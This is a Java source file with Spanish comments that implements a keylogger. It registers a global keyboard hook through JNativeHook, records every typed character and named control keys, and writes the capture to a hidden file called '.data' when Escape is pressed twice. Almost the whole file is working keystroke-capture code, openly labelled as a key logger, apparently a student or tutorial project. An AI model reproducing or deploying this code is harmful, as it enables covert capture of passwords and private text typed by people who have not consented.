package keylogger;

//Importando las clases necesarias para realizar el Key Logger.
import com.sun.glass.events.KeyEvent;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * Clase principal del Key Logger, la cual implementa una interfaz llamada NativeKeyListener. 
 * @author rafael
 */
public class KeyLogger implements NativeKeyListener{

    /**
     * Aqui se encuentran los atributos utilizados por la clase, los cuales nos sirven para almacenar cadenas de
     * texto o caracteres, maniuplar flujos de caracteres y escribir en un archivo. De igual forma, 
     * se encuentra un entero el cual servira para determinar cuando finalizar el Key Logger, 
     * como se detallara mas adelante en el programa.
     */
    private StringBuffer text = new StringBuffer("");
    private BufferedWriter bufferWriter;
    private PrintWriter printWriter;
    private FileWriter fieWriter;
    private int exit = 0;
    
    /**
     * Constructor de la clase, en donde se utiliza la clase GlobalScreen para obtener la entrada 
     * basica de la pantalla, a ala cual Java no tiene acceso regularmente y, mediante el metodo
     * registerNativeHook(), se especifica que se hara uso de un listener global.
     * Lo anterior se pone en un bloque try-catch, pues se puede originar la excepcion de que 
     * ya exista uno o se cree algun conflicto. 
     * Por ultimo, se crea el listener que estara a la espera de informacion tecleada.
     */
    KeyLogger(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        }
        GlobalScreen.getInstance().addNativeKeyListener(this);
    }
    
    /**
     * Metodo principal que crea un objeto para poder utilizar el Key Logger.
     * @param args 
     */
    public static void main(String[] args) {
        KeyLogger m = new KeyLogger();  
    }
    
    /**
     * Este sera el metodo encargado de mandar todas las teclas escritas por el usuario al 
     * archivo, por lo que, se utiliza un FileWriter para abrir el flujo de caracteres con el archivo. 
     * Además de eso, este metodo es el encargado de terminar la ejecucion del Key Logger.
     * Todas aquellas teclas presionadas por el usuario que sean de control como enter, backspace, etc,
     * se iran almacenando en el StringBuffer con el metodo append(). Para realizar esto, 
     * se utiliza un switch para identificarlas y que se almacenen con el nombre de la tecla presionada, y no
     * con el ASCII asociado a dicha tecla de control. Solamente la tecla Escape no se escribe, en cambio, cuando
     * es presionada, se aumenta en uno el valor de la variable exit.
     * Si se presiona la tecla escape, se aumenta en uno el valor de la variable de instancia exit. Si
     * se presiona la tecla escape dos veces seguidas, entonces se manda todo lo almacenado en el 
     * StringBuffer al archivo, haciendo uso del BufferedWriter y del PrintWriter. Con el metodo
     * println() se manda todo lo que contiene StringBuffer y, finalmente, se cierra el flujo de datos, acabando
     * asi la ejecucion del KeyLogger.
     * @param nke 
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        //System.out.println("Se presiono una tecla");
        
        switch(nke.getKeyCode()){
            case KeyEvent.VK_ESCAPE:{
                exit++;
            }break;
            case KeyEvent.VK_ENTER:{
                text.append("\n {Enter} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_BACKSPACE:{
                text.append("\n {BACKSPACE} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_NUM_LOCK:{
                text.append("\n {NUM_LOCK} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_LEFT:{
                text.append("\n {LEFT} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_RIGHT:{
                text.append("\n {RIGHT} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_UP:{
                text.append("\n {UP} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_DOWN:{
                text.append("\n {DOWN} ");
                if(exit > 0) exit--;
            }break;
        }
        if(exit > 1 ){
            try {
                this.fieWriter = new FileWriter(".data");
                bufferWriter = new BufferedWriter(fieWriter);
                printWriter = new PrintWriter(bufferWriter);
                printWriter.println(text);
                printWriter.close();
            } catch (Exception e) {
                System.out.println(e);
            }
            System.exit(0);   
        }
    }

    /**
     * Este metodo no cuenta con cuerpo, sin embargo, sirve para cuando se deja de presionar
     * una tecla.
     * @param nke 
     */
    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        //System.out.println("Se solto una tecla");
    }

    /**
     * Este metodo es el encargado de ir anexando las teclas presionadas al StringBuffer. Se tiene una
     * condicion extra, para determinar cuando terminar la ejeucion del programa. Cuando una tecla escape
     * es presionada, se aumenta en uno el valor de la variable exit como se vio en el
     * metodo nativeKeyPressed, sin embargo, para terminar la ejecucion del Key Logger, se tiene que presionar 
     * la tecla escape dos veces seguidas, por lo que, si se presiona dos veces en distintos momentos de tiempo, 
     * el programa terminaria, entonces, para evitar esto, tenemos que decrementar el valor de 
     * la variable exit si no se presiona la tecla escape dos veces seguidas.
     * @param nke 
     */
    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        text.append(nke.getKeyChar());
        if(exit > 0) exit--;
    }
    
}
